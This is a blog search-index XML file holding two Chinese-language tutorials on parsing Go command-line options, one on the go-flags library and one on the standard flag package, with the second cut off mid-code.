<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Go 库之go-flag</title>
      <link href="2021/06/17/go-ku-zhi-go-flag/"/>
      <url>2021/06/17/go-ku-zhi-go-flag/</url>
      
        <content type="html"><![CDATA[<h1 id="go-flag库"><a href="#go-flag库" class="headerlink" title="go-flag库"></a>go-flag库</h1><span id="more"></span><p>#简介<br>在上篇文章中，基础的介绍了flag库，并提供了基础用法及将两个选项共享同一个变量迂回实现，但写起来比较繁琐而且存在选项变量的定义比较繁琐，每个选项都需要根据类型调用对应的Type或TypeVar函数，默认只支持有限的数据类型，当前只有基本类型bool/int/uint/string和time.Duration等问题，为了解决这个问题，今天学习go-flag库、</p><p>go-flags提供了比标准库flag更多的选项。它利用结构标签（struct tag）和反射提供了一个方便、简洁的接口。它除了基本的功能，还提供了丰富的特性：</p><p>1 ：支持短选项（-v）和长选项（–verbose）</p><p>2：支持短选项合写，如-aux</p><p>3：同一个选项可以设置多个值</p><p>4：支持所有的基础类型和 map 类型，甚至是函数</p><p>5：支持命名空间和选项组，等</p><h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><h2 id="库安装"><a href="#库安装" class="headerlink" title="库安装"></a>库安装</h2><p>由于go-flag 为第三库，需要提前安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">go get github.com&#x2F;jessevdk&#x2F;go-flags<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此处存在坑注意规避：<br>1、当我使用GoLond 加载go-flags库时，总是timeout，我尝试通过github下载后拖进引用会出现配置错误，后经过更换IP，挂代理等方式成功，或者等早上或者晚上的时候尝试</p><p>2、 当运行Go-flags 库后 会存在 需要golang.org/x/sys 报错，直接去github下载相应文件，放入src对应目录下即可，地址：<a href="https://github.com/golang/sys">https://github.com/golang/sys</a></p><h2 id="快速食用"><a href="#快速食用" class="headerlink" title="快速食用"></a>快速食用</h2><p>完整示例代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"fmt"</span>  <span class="token string">"github.com/jessevdk/go-flags"</span><span class="token punctuation">)</span><span class="token keyword">type</span> Option <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  Verbose <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">bool</span> <span class="token string">`short:"v" long:"verbose" description:"Show verbose debug message"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> opt Option  flags<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>opt<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>Verbose<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译运行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;go-flag -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果如下</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Usage:  go-flag [OPTIONS]Application Options:  -v, --verbose  Show verbose debug messageHelp Options:  -h, --help     Show this help message[]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>go-flag 简单使用步骤<br>1、 定义选项结构，在结构标签中设置选项信息。通过short和long设置短、长选项名字，description设置帮助信息。命令行传参时，短选项前加-，长选项前加–</p><p>2、 声明选项变量</p><p>3、 调用go-flags的解析方法解析<br>注意：由于Verbose字段是切片类型，每次遇到-v或–verbose都会追加一个true到切片中<br>如：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;go-flag -v -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示结果如下</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[true true]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h1><h2 id="1、-支持丰富的数据类型"><a href="#1、-支持丰富的数据类型" class="headerlink" title="1、 支持丰富的数据类型"></a>1、 支持丰富的数据类型</h2><p> 1.1 所有的基本类型（包括有符号整数int/int8/int16/int32/int64，无符号整数uint/uint8/uint16/uint32/uint64，浮点数float32/float64，布尔类型bool和字符串string）和它们的切片<br> 1.2 map 类型。只支持键为string，值为基础类型的 map<br> 1.3 函数类型</p><p>示例：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"fmt"</span>  <span class="token string">"github.com/jessevdk/go-flags"</span><span class="token punctuation">)</span><span class="token keyword">type</span> Option <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  IntFlag         <span class="token builtin">int</span>             <span class="token string">`short:"i" long:"int" description:"int flag value"`</span>  IntSlice        <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>           <span class="token string">`long:"intslice" description:"int slice flag value"`</span>  BoolFlag        <span class="token builtin">bool</span>            <span class="token string">`long:"bool" description:"bool flag value"`</span>  BoolSlice       <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">bool</span>          <span class="token string">`long:"boolslice" description:"bool slice flag value"`</span>  FloatFlag       <span class="token builtin">float64</span>         <span class="token string">`long:"float", description:"float64 flag value"`</span>  FloatSlice      <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">float64</span>       <span class="token string">`long:"floatslice" description:"float64 slice flag value"`</span>  StringFlag      <span class="token builtin">string</span>          <span class="token string">`short:"s" long:"string" description:"string flag value"`</span>  StringSlice     <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>        <span class="token string">`long:"strslice" description:"string slice flag value"`</span>  PtrStringSlice  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">string</span>       <span class="token string">`long:"pstrslice" description:"slice of pointer of string flag value"`</span>  Call            <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>    <span class="token string">`long:"call" description:"callback"`</span>  IntMap          <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span>  <span class="token string">`long:"intmap" description:"A map from string to int"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> opt Option  opt<span class="token punctuation">.</span>Call <span class="token operator">=</span> <span class="token keyword">func</span> <span class="token punctuation">(</span>value <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"in callback: "</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> flags<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>opt<span class="token punctuation">)</span>  <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Parse error:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>    <span class="token keyword">return</span>  <span class="token punctuation">&#125;</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"int flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>IntFlag<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"int slice flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>IntSlice<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"bool flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>BoolFlag<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"bool slice flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>BoolSlice<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"float flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>FloatFlag<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"float slice flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>FloatSlice<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"string flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>StringFlag<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"string slice flag: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>StringSlice<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"slice of pointer of string flag: "</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>PtrStringSlice<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"\t%d: %v\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span>opt<span class="token punctuation">.</span>PtrStringSlice<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"int map: %v\n"</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>IntMap<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="常用设置"><a href="#常用设置" class="headerlink" title="常用设置"></a>常用设置</h1><p>go-flags提供了非常多的设置选项，具体可参见:<a href="https://godoc.org/github.com/jessevdk/go-flags">https://godoc.org/github.com/jessevdk/go-flags</a><br>此处介绍俩个：<br>1、 required<br>required非空时，表示对应的选项必须设置值，否则解析时返回ErrRequired错误</p><p>2、default<br>default用于设置选项的默认值。如果已经设置了默认值，那么required是否设置并不影响，也就是说命令行参数中该选项可以没有</p><h1 id="高级设置"><a href="#高级设置" class="headerlink" title="高级设置"></a>高级设置</h1><h2 id="选项分组"><a href="#选项分组" class="headerlink" title="选项分组"></a>选项分组</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"fmt"</span>  <span class="token string">"log"</span>  <span class="token string">"os"</span>      <span class="token string">"github.com/jessevdk/go-flags"</span><span class="token punctuation">)</span><span class="token keyword">type</span> Option <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  Basic GroupBasicOption <span class="token string">`description:"basic type" group:"basic"`</span>  Slice GroupSliceOption <span class="token string">`description:"slice of basic type" group:"slice"`</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> GroupBasicOption <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  IntFlag    <span class="token builtin">int</span>     <span class="token string">`short:"i" long:"intflag" description:"int flag"`</span>  BoolFlag   <span class="token builtin">bool</span>    <span class="token string">`short:"b" long:"boolflag" description:"bool flag"`</span>  FloatFlag  <span class="token builtin">float64</span> <span class="token string">`short:"f" long:"floatflag" description:"float flag"`</span>  StringFlag <span class="token builtin">string</span>  <span class="token string">`short:"s" long:"stringflag" description:"string flag"`</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> GroupSliceOption <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  IntSlice<span class="token builtin">int</span><span class="token string">`long:"intslice" description:"int slice"`</span>  BoolSlice<span class="token builtin">bool</span><span class="token string">`long:"boolslice" description:"bool slice"`</span>  FloatSlice<span class="token builtin">float64</span><span class="token string">`long:"floatslice" description:"float slice"`</span>  StringSlice<span class="token builtin">string</span><span class="token string">`long:"stringslice" description:"string slice"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> opt Option  p <span class="token operator">:=</span> flags<span class="token punctuation">.</span><span class="token function">NewParser</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>opt<span class="token punctuation">,</span> flags<span class="token punctuation">.</span>Default<span class="token punctuation">)</span>  <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> p<span class="token punctuation">.</span><span class="token function">ParseArgs</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>Args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>    log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"Parse error:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>      basicGroup <span class="token operator">:=</span> p<span class="token punctuation">.</span>Command<span class="token punctuation">.</span>Group<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"basic"</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> option <span class="token operator">:=</span> <span class="token keyword">range</span> basicGroup<span class="token punctuation">.</span><span class="token function">Options</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"name:%s value:%v\n"</span><span class="token punctuation">,</span> option<span class="token punctuation">.</span><span class="token function">LongNameWithNamespace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> option<span class="token punctuation">.</span><span class="token function">Value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  sliceGroup <span class="token operator">:=</span> p<span class="token punctuation">.</span>Command<span class="token punctuation">.</span>Group<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token string">"slice"</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> option <span class="token operator">:=</span> <span class="token keyword">range</span> sliceGroup<span class="token punctuation">.</span><span class="token function">Options</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"name:%s value:%v\n"</span><span class="token punctuation">,</span> option<span class="token punctuation">.</span><span class="token function">LongNameWithNamespace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> option<span class="token punctuation">.</span><span class="token function">Value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子命令"><a href="#子命令" class="headerlink" title="子命令"></a>子命令</h2><p>go-flags支持子命令。我们经常使用的 Go 和 Git 命令行程序就有大量的子命令。例如go version、go build、go run、git status、git commit这些命令中version/build/run/status/commit就是子命令。 使用go-flags定义子命令比较简单：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"errors"</span>  <span class="token string">"fmt"</span>  <span class="token string">"log"</span>  <span class="token string">"strconv"</span>  <span class="token string">"strings"</span>  <span class="token string">"github.com/jessevdk/go-flags"</span><span class="token punctuation">)</span><span class="token keyword">type</span> MathCommand <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  Op <span class="token builtin">string</span> <span class="token string">`long:"op" description:"operation to execute"`</span>  Args <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>  Result <span class="token builtin">int64</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>this <span class="token operator">*</span>MathCommand<span class="token punctuation">)</span> <span class="token function">Execute</span><span class="token punctuation">(</span>args <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> this<span class="token punctuation">.</span>Op <span class="token operator">!=</span> <span class="token string">"+"</span> <span class="token operator">&amp;&amp;</span> this<span class="token punctuation">.</span>Op <span class="token operator">!=</span> <span class="token string">"-"</span> <span class="token operator">&amp;&amp;</span> this<span class="token punctuation">.</span>Op <span class="token operator">!=</span> <span class="token string">"x"</span> <span class="token operator">&amp;&amp;</span> this<span class="token punctuation">.</span>Op <span class="token operator">!=</span> <span class="token string">"/"</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"invalid op"</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> arg <span class="token operator">:=</span> <span class="token keyword">range</span> args <span class="token punctuation">&#123;</span>    num<span class="token punctuation">,</span> err <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseInt</span><span class="token punctuation">(</span>arg<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> err    <span class="token punctuation">&#125;</span>    this<span class="token punctuation">.</span>Result <span class="token operator">+=</span> num  <span class="token punctuation">&#125;</span>  this<span class="token punctuation">.</span>Args <span class="token operator">=</span> args  <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> Option <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Math MathCommand <span class="token string">`command:"math"`</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> opt Option<span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> flags<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>opt<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"The result of %s is %d"</span><span class="token punctuation">,</span> strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>opt<span class="token punctuation">.</span>Math<span class="token punctuation">.</span>Args<span class="token punctuation">,</span> opt<span class="token punctuation">.</span>Math<span class="token punctuation">.</span>Op<span class="token punctuation">)</span><span class="token punctuation">,</span> opt<span class="token punctuation">.</span>Math<span class="token punctuation">.</span>Result<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>子命令必须实现go-flags定义的Commander接口：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Commander <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>    <span class="token function">Execute</span><span class="token punctuation">(</span>args <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解析命令行时，如果遇到不是以-或–开头的参数，go-flags会尝试将其解释为子命令名。子命令的名字通过在结构标签中使用command指定。 子命令后面的参数都将作为子命令的参数，子命令也可以有选项</p>]]></content>
      
      
      
        <tags>
            
            <tag> Go语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 库之 flag</title>
      <link href="2021/06/16/go-ku-zhi-flag/"/>
      <url>2021/06/16/go-ku-zhi-flag/</url>
      
        <content type="html"><![CDATA[<h1 id="Flag-库"><a href="#Flag-库" class="headerlink" title="Flag 库"></a>Flag 库</h1><span id="more"></span><p>##1 简介<br>flag 用于解析命令选项，常用语工具开发过程中的命令行选项</p><p>##2 快速使用<br>以下为flag库基本使用</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"flag"</span><span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>intflag <span class="token builtin">int</span>boolflag <span class="token builtin">bool</span>stringflag <span class="token builtin">string</span>period time<span class="token punctuation">.</span>Duration<span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span><span class="token function">IntVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>intflag<span class="token punctuation">,</span><span class="token string">"intflag"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"int flag value"</span><span class="token punctuation">)</span>flag<span class="token punctuation">.</span><span class="token function">BoolVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>boolflag<span class="token punctuation">,</span><span class="token string">"boolflag"</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token string">"bool flag value"</span><span class="token punctuation">)</span>flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stringflag<span class="token punctuation">,</span><span class="token string">"stringflag"</span><span class="token punctuation">,</span><span class="token string">"defalute"</span><span class="token punctuation">,</span><span class="token string">"string flga value"</span><span class="token punctuation">)</span>flag<span class="token punctuation">.</span><span class="token function">DurationVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>period<span class="token punctuation">,</span><span class="token string">"period"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">*</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span><span class="token string">"sleep period"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"int flag"</span><span class="token punctuation">,</span>intflag<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"string flag"</span><span class="token punctuation">,</span>stringflag<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Bool flag "</span><span class="token punctuation">,</span>boolflag<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"sleep for %v..."</span><span class="token punctuation">,</span>period<span class="token punctuation">)</span>time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>period<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本编译后运行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;flag   -intflag 3 -period 10s -stringflag test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入如下结果</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token builtin">int</span> flag <span class="token number">3</span><span class="token builtin">string</span> flag testBool flag  <span class="token boolean">false</span>sleep <span class="token keyword">for</span> <span class="token operator">%</span>v<span class="token operator">...</span> <span class="token number">10</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当我们不对某一值做具体设定时，则使用默认值</p><p>##3 总结</p><h3 id="3-1-flag库使用步骤"><a href="#3-1-flag库使用步骤" class="headerlink" title="3.1 flag库使用步骤"></a>3.1 flag库使用步骤</h3><p>1 定义全局变量存储选项值，如 intflga/boolflag/Stringflag/period<br>2 在init方法中使用 flag.TypleVar方法定义选项，Tpye可以为基本类型<br>3 在main方法中调用flag.Parse 从OS.Args[1:]中解析选项</p><p>###3.2 注意点<br>flag.Parse方法必须在所有选项都定义之后调用，且flag.Parse调用之后不能再定义选项。如果按照前面的步骤，基本不会出现问题。 因为init在所有代码之前执行，将选项定义都放在init中，main函数中执行flag.Parse时所有选项都已经定义了</p><h2 id="4-另一种定义选项方法"><a href="#4-另一种定义选项方法" class="headerlink" title="4 另一种定义选项方法"></a>4 另一种定义选项方法</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"fmt"</span>  <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>  intflag <span class="token operator">*</span><span class="token builtin">int</span>  boolflag <span class="token operator">*</span><span class="token builtin">bool</span>  stringflag <span class="token operator">*</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  intflag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">Int</span><span class="token punctuation">(</span><span class="token string">"intflag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"int flag value"</span><span class="token punctuation">)</span>  boolflag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">Bool</span><span class="token punctuation">(</span><span class="token string">"boolflag"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"bool flag value"</span><span class="token punctuation">)</span>  stringflag <span class="token operator">=</span> flag<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token string">"stringflag"</span><span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">,</span> <span class="token string">"string flag value"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"int flag:"</span><span class="token punctuation">,</span> <span class="token 